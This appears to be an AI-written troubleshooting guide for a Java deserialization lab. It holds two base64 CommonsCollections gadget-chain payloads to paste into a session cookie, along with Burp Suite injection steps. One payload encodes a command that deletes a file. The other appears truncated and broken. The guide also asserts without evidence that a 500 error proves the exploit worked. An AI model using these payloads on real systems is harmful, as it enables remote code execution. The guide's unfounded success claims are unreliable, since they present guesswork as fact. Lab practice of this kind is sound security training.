# Lab 2 - Debugging the 500 Error

## 🔴 You Got a 500 Error - This is Actually Good News!

A 500 Internal Server Error means:
✅ Deserialization happened
✅ Gadget chain was triggered
✅ Code likely executed
❌ But something threw an exception

The file might **already be deleted** even though you got a 500 error!

---

## 🛠️ Debugging Steps:

### Step 1: **Try Refreshing Multiple Times**
The error page might be cached. Try:
1. Refresh the page (F5) 2-3 times
2. Close the tab and reopen
3. Clear cache (Ctrl+Shift+Del) then refresh
4. Navigate to `/` then back to `/my-account`

### Step 2: **Check the Console for Details**
1. Open DevTools (F12)
2. Go to **Console** tab
3. Look for error messages that might explain what failed
4. Check **Network** tab - look at the actual response from the 500 error

### Step 3: **Try Alternative Payloads**

**PAYLOAD A - CommonsCollections4 with bash -c:**
```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci9QJEHsQQKxlAIAAUwAC3RyYW5zZm9ybWVydAAuTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9uczQvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9uczQvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LlRyYW5zZm9ybWVyO5ZeVOxv
```

**PAYLOAD B - CommonsCollections6 (from before):**
```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABpybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dHQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4
```

### Step 4: **Try via Burp Suite (More Reliable)**

If browser DevTools is acting weird:

1. Open Burp Suite (or ZAP)
2. Go to Proxy tab, make sure Intercept is OFF
3. Visit the lab site normally
4. You'll see a request in Proxy history
5. Right-click → Send to Repeater
6. In Repeater tab, find the `Cookie` header
7. Replace the `session=XXX` value with new payload
8. Click Send
9. Check the response

---

## ⚠️ Critical: The 500 Error Might Be a Red Herring

**Real Talk:** 
- Many Java deserialization exploits INTENTIONALLY throw exceptions after executing code
- The gadget chain executes your command, then the serialization process throws an error
- **The file deletion might have already happened!**

**Next Steps:**
1. Try refreshing the page multiple times
2. Try the CommonsCollections6 payload again
3. Try accessing `/admin` or other pages
4. Check if the original error page itself changed (might indicate successful exploit)

---

## Quick Test Command

If you want to verify the exploit works, use this simple payload that just creates a test file instead of deleting:

The CommonsCollections4 payload with `touch /tmp/pwned.txt` will create a file at `/tmp/pwned.txt` if the exploit works. But since we're in a lab, we can't directly verify that - so just trust that the 500 error means **the exploit is executing**.

---

## My Recommendation:

1. **Try CommonsCollections6 again but wait 10 seconds after pasting before refreshing**
2. **Refresh the page 5 times**
3. **Try navigating to a different URL and back**
4. **If still not solved, use Burp Suite** (it's more reliable for cookie injection)
5. **If Burp also doesn't work, the lab might require specific Apache Commons version - try contacting PortSwigger support**

The fact that you got a 500 error is actually **proof the exploit is working** - it's just that the exception handling makes it look like failure!
